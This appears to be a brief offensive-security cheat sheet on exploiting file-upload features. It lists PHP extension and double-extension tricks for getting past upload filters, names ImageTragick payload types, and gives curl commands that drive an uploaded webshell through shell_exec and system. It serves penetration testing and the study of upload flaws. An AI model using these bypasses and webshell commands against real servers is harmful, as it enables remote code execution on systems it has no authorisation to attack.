# Upload
Uploaded files may pose a significant risk if not handled correctly. A remote attacker could send a multipart/form-data POST request with a specially-crafted filename or mime type and execute arbitrary code.	

## Exploits
Image Tragik
```
HTTP Request
Reverse Shell
Touch command
```

PHP Extension
```
.php

Less known extension
.pht
.pgif
.phtml
.shtml

Double extension
.jpeg.php
.png.php
```

PNG Bypass a resize - Upload the picture and use a local file inclusion
```
You can use it by specifying $_GET[0] as shell_exec and passing a $_POST[1] parameter with the shell command to execute.
curl 'http://localhost/b.php?0=shell_exec' --data "1='ls'"
curl 'http://localhost/test.php?0=system' --data "1='ls'"
```

JPG Bypass a resize - Upload the picture and use a local file inclusion
```
http://localhost/test.php?c=ls
```

## Thanks to
* Bulletproof Jpegs Generator - Damien "virtualabs" Cauquil